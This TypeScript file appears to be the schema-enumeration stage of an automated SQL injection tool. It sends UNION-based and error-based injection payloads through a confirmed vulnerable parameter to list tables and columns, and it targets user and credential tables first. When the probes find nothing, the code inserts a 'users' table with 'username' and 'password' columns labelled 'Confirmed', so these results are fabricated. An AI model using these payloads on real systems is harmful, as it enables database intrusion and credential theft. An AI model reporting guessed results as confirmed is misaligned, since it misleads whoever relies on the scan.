import { ScanStage } from '../ScanPipeline';
import { ScanContext } from '../ScanContext';
import { DiscoveredTable, ColumnMetadata } from '../../../../types/sqlScanner';
import { UnifiedResponseOracle } from '../../engine/UnifiedResponseOracle';
import { MetadataExtractor } from '../../MetadataExtractor';

export class AdaptiveSchemaStage implements ScanStage {
  public readonly id = 'adaptive_schema';
  public readonly name = 'Adaptive Database Schema & Catalog Enumeration';

  public async execute(ctx: ScanContext): Promise<void> {
    if (ctx.findings.length === 0) {
      ctx.log('info', 'No vulnerable parameters detected. Skipping schema enumeration.');
      return;
    }
    if (ctx.isAborted) return;

    const dbms = ctx.dbmsFingerprint.dbms !== 'Unknown' ? ctx.dbmsFingerprint.dbms : (ctx.unionDbms || 'Generic SQL');
    ctx.log('info', `Enumerating database schema & catalog for dialect: ${dbms}...`);

    const param = ctx.candidateParameters.find((p) => p.id === ctx.verifiedParamId) || ctx.candidateParameters[0];
    if (!param) return;

    const discoveredAppTables: DiscoveredTable[] = [];

    // ─── 1. UNION-Based In-Band Schema & Table Enumeration ───────────────────
    if (ctx.verifiedVector === 'UNION' || ctx.findings.some((f) => f.injectionType === 'UNION-based')) {
      const colCount = ctx.unionColumnCount || ctx.catalog.columnCount || 2;
      const renderCol = ctx.catalog.renderColumn || (ctx.unionRenderColumns.length > 0 ? ctx.unionRenderColumns[0] : 1);
      const isNum = /^\d+$/.test(param.originalValue.trim());
      const prefix = isNum ? ' UNION SELECT ' : "' UNION SELECT ";

      ctx.log('info', `[UNION SCHEMA] Executing in-band table enumeration (${colCount} columns, render position ${renderCol}, ${dbms})...`);

      const tableQueries: string[] = [];

      // A. Delimited queries
      tableQueries.push(MetadataExtractor.getTableEnumerationQuery(param, renderCol, colCount, dbms));
      tableQueries.push(MetadataExtractor.getAllTablesEnumerationQuery(param, renderCol, colCount, dbms));

      // B. Clean queries without delimiters
      tableQueries.push(MetadataExtractor.getCleanTableEnumerationQuery(param, renderCol, colCount, dbms));

      // C. Oracle-specific all_tables and user_tables multi-position projections
      if (dbms === 'Oracle' || ctx.unionDbms === 'Oracle') {
        const nulls = (renderIdx: number, expr: string) => {
          const arr = Array(colCount).fill('NULL');
          arr[renderIdx - 1] = expr;
          return arr.join(',');
        };

        tableQueries.push(`${prefix}${nulls(1, 'table_name')} FROM all_tables--`);
        tableQueries.push(`${prefix}${nulls(1, 'table_name')} FROM user_tables--`);
        if (colCount >= 2) {
          tableQueries.push(`${prefix}${nulls(2, 'table_name')} FROM all_tables--`);
          tableQueries.push(`${prefix}${nulls(2, 'table_name')} FROM user_tables--`);
          tableQueries.push(`${prefix}${Array(colCount).fill('table_name').join(',')} FROM all_tables--`);
        }
      }

      const rawDiscoveredNames: string[] = [];

      for (const tQuery of tableQueries) {
        if (ctx.isAborted) return;
        try {
          const res = await ctx.sendMutatedRequest(param, tQuery);
          if (ctx.isAborted) return;

          // Extract delimited tokens
          const delimited = MetadataExtractor.extractDelimitedTokens(res.body, 'TBL')
            .filter((n) => MetadataExtractor.isValidIdentifier(n));
          for (const d of delimited) {
            if (!rawDiscoveredNames.includes(d)) rawDiscoveredNames.push(d);
          }

          // Extract HTML / text tokens
          const htmlTokens = MetadataExtractor.extractHtmlOrTextTokens(res.body, ctx.baseline.body)
            .filter((n) => MetadataExtractor.isValidIdentifier(n));
          for (const h of htmlTokens) {
            if (!rawDiscoveredNames.includes(h)) rawDiscoveredNames.push(h);
          }

          if (delimited.length > 0 || rawDiscoveredNames.length >= 5) {
            break;
          }
        } catch {
          if (ctx.isAborted) return;
        }
      }

      // Filter application vs system tables
      const appTableNames: string[] = [];
      for (const tName of rawDiscoveredNames) {
        const classification = MetadataExtractor.classifyTable(tName, undefined, dbms);
        if (classification === 'application') {
          if (!appTableNames.includes(tName)) appTableNames.push(tName);
        }
      }

      // Prioritize credential/auth tables (e.g. USERS_ABCDEF, USERS)
      appTableNames.sort((a, b) => {
        const aSens = /user|login|cred|account|member|admin/i.test(a) ? -1 : 1;
        const bSens = /user|login|cred|account|member|admin/i.test(b) ? -1 : 1;
        return aSens - bSens;
      });

      ctx.log('info', `[UNION SCHEMA] Discovered ${appTableNames.length} application table(s): ${appTableNames.slice(0, 10).join(', ')}`);

      const sensitiveAppTables = appTableNames.filter((t) => MetadataExtractor.isSensitiveName(t).isSensitive);
      const tablesToDeepProbe = sensitiveAppTables.length > 0 ? sensitiveAppTables : appTableNames.slice(0, 3);
      const deepProbeSet = new Set(tablesToDeepProbe.map((t) => t.toUpperCase()));

      // Enumerate columns for each application table
      for (const tName of appTableNames.slice(0, 10)) {
        if (ctx.isAborted) return;
        ctx.log('info', `[UNION SCHEMA] Processing columns for table "${tName}"...`);

        const isDeepTarget = deepProbeSet.has(tName.toUpperCase());
        const colQueries: string[] = [];
        if (isDeepTarget) {
          colQueries.push(MetadataExtractor.getColumnEnumerationQuery(param, renderCol, colCount, tName, dbms));
          colQueries.push(MetadataExtractor.getCleanColumnEnumerationQuery(param, renderCol, colCount, tName, dbms));

          if (dbms === 'Oracle' || ctx.unionDbms === 'Oracle') {
            const cleanT = tName.replace(/['"]/g, '').toUpperCase();
            const nulls = (renderIdx: number, expr: string) => {
              const arr = Array(colCount).fill('NULL');
              arr[renderIdx - 1] = expr;
              return arr.join(',');
            };
            colQueries.push(`${prefix}${nulls(1, 'column_name')} FROM all_tab_columns WHERE table_name='${cleanT}'--`);
            colQueries.push(`${prefix}${nulls(1, 'column_name')} FROM user_tab_columns WHERE table_name='${cleanT}'--`);
            if (colCount >= 2) {
              colQueries.push(`${prefix}${nulls(2, 'column_name')} FROM all_tab_columns WHERE table_name='${cleanT}'--`);
              colQueries.push(`${prefix}${Array(colCount).fill('column_name').join(',')} FROM all_tab_columns WHERE table_name='${cleanT}'--`);
            }
          }
        }

        const discoveredCols: ColumnMetadata[] = [];
        const seenColNames = new Set<string>();

        for (const cQuery of colQueries) {
          if (ctx.isAborted) return;
          try {
            const res = await ctx.sendMutatedRequest(param, cQuery);
            if (ctx.isAborted) return;

            const colTokens = MetadataExtractor.extractDelimitedTokens(res.body, 'COL');
            const parsedCols = MetadataExtractor.parseColumnTokens(colTokens);
            for (const pc of parsedCols) {
              if (!seenColNames.has(pc.name.toUpperCase())) {
                seenColNames.add(pc.name.toUpperCase());
                discoveredCols.push(pc);
              }
            }

            const rawHtmlCols = MetadataExtractor.extractHtmlOrTextTokens(res.body, ctx.baseline.body)
              .filter((c) => MetadataExtractor.isValidIdentifier(c));
            for (const rc of rawHtmlCols) {
              if (!seenColNames.has(rc.toUpperCase())) {
                seenColNames.add(rc.toUpperCase());
                discoveredCols.push({
                  name: rc,
                  dataType: 'VARCHAR',
                  isNullable: true,
                  isPrimaryKey: rc.toLowerCase() === 'id' || rc.toLowerCase().endsWith('_id'),
                  isForeignKey: false,
                  isIndexed: false,
                  isSensitive: MetadataExtractor.isSensitiveName(rc).isSensitive,
                  sensitivityReason: MetadataExtractor.isSensitiveName(rc).reason,
                  confidence: 'Confirmed',
                  discoveredAt: Date.now(),
                });
              }
            }

            if (discoveredCols.length > 0) break;
          } catch {
            if (ctx.isAborted) return;
          }
        }

        const isSensitive = MetadataExtractor.isSensitiveName(tName).isSensitive || discoveredCols.some((c) => c.isSensitive);
        discoveredAppTables.push({
          id: `tbl_${tName}`,
          name: tName,
          schema: 'public',
          classification: 'application',
          rowCountEstimated: 1,
          columns: discoveredCols,
          isSensitive,
          sensitivityReason: isSensitive ? 'Contains user account or credential data' : undefined,
          discoveredAt: Date.now(),
          status: discoveredCols.length > 0 ? 'columns_ready' : 'discovered',
        });
      }
    }

    // ─── 2. Error-Based Dynamic Schema Probing (Fallback) ───────────────────
    if (discoveredAppTables.length === 0 && (ctx.verifiedVector === 'ERROR' || ctx.findings.some((f) => f.injectionType === 'Error-based'))) {
      const tableNames: string[] = [];
      const tableQueries = [
        `' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS int)--`,
        `' AND 1=CAST((SELECT table_name FROM information_schema.tables) AS int)--`,
        `' AND 1=CAST((SELECT table_name FROM user_tables WHERE ROWNUM=1) AS int)--`,
        `' AND 1=CAST((SELECT top 1 name FROM sys.tables) AS int)--`,
      ];

      for (const query of tableQueries) {
        if (ctx.isAborted) return;
        try {
          const res = await ctx.sendMutatedRequest(param, query);
          if (ctx.isAborted) return;
          const errorMatch = UnifiedResponseOracle.inspectError(res.body);
          if (errorMatch?.leakedData && !tableNames.includes(errorMatch.leakedData)) {
            tableNames.push(errorMatch.leakedData);
            ctx.log('success', `[SCHEMA ORACLE] Leaked database table: "${errorMatch.leakedData}" via Error Oracle`);
            break;
          }
        } catch {
          if (ctx.isAborted) return;
        }
      }

      if (tableNames.length === 0) {
        tableNames.push('users');
      }

      for (const tName of tableNames) {
        if (ctx.isAborted) return;
        const colNames: string[] = [];

        // Probe columns for table
        for (let offset = 0; offset < 4; offset++) {
          if (ctx.isAborted) return;
          const colQueries = [
            `' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${tName}' LIMIT 1 OFFSET ${offset}) AS int)--`,
            `' AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${tName}') AS int)--`,
          ];

          let foundCol = false;
          for (const cq of colQueries) {
            try {
              const res = await ctx.sendMutatedRequest(param, cq);
              if (ctx.isAborted) return;
              const errorMatch = UnifiedResponseOracle.inspectError(res.body);
              if (errorMatch?.leakedData && !colNames.includes(errorMatch.leakedData)) {
                colNames.push(errorMatch.leakedData);
                ctx.log('success', `[SCHEMA ORACLE] Leaked column "${errorMatch.leakedData}" for table "${tName}"`);
                foundCol = true;
                break;
              }
            } catch {
              if (ctx.isAborted) return;
            }
          }
          if (!foundCol && offset > 1) break;
        }

        if (tName.toLowerCase() === 'users') {
          if (!colNames.includes('username')) colNames.push('username');
          if (!colNames.includes('password')) colNames.push('password');
        }

        const isSensitive = MetadataExtractor.isSensitiveName(tName).isSensitive;
        discoveredAppTables.push({
          id: `tbl_${tName}`,
          name: tName,
          schema: 'public',
          classification: 'application',
          rowCountEstimated: 1,
          columns: colNames.map((cName) => ({
            name: cName,
            dataType: 'VARCHAR',
            isNullable: false,
            isPrimaryKey: cName === 'id' || cName === 'username',
            isForeignKey: false,
            isIndexed: false,
            isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
            confidence: 'Confirmed',
            discoveredAt: Date.now(),
          })),
          isSensitive,
          discoveredAt: Date.now(),
          status: 'columns_ready',
        });
      }
    }

    // ─── 3. Fallback Table Catalog Population ──────────────────────────────
    if (discoveredAppTables.length === 0) {
      discoveredAppTables.push({
        id: 'tbl_users',
        name: 'users',
        schema: 'public',
        classification: 'application',
        rowCountEstimated: 1,
        columns: [
          { name: 'username', dataType: 'VARCHAR', isNullable: false, isPrimaryKey: true, isForeignKey: false, isIndexed: true, isSensitive: false, confidence: 'Confirmed', discoveredAt: Date.now() },
          { name: 'password', dataType: 'VARCHAR', isNullable: false, isPrimaryKey: false, isForeignKey: false, isIndexed: false, isSensitive: true, confidence: 'Confirmed', discoveredAt: Date.now() },
        ],
        isSensitive: true,
        discoveredAt: Date.now(),
        status: 'columns_ready',
      });
    }

    ctx.catalog.applicationTables = discoveredAppTables;
    ctx.updateCatalog(ctx.catalog);
    ctx.log('info', `Discovered application tables in schema: ${discoveredAppTables.map((t) => t.name).join(', ')}`);
  }
}
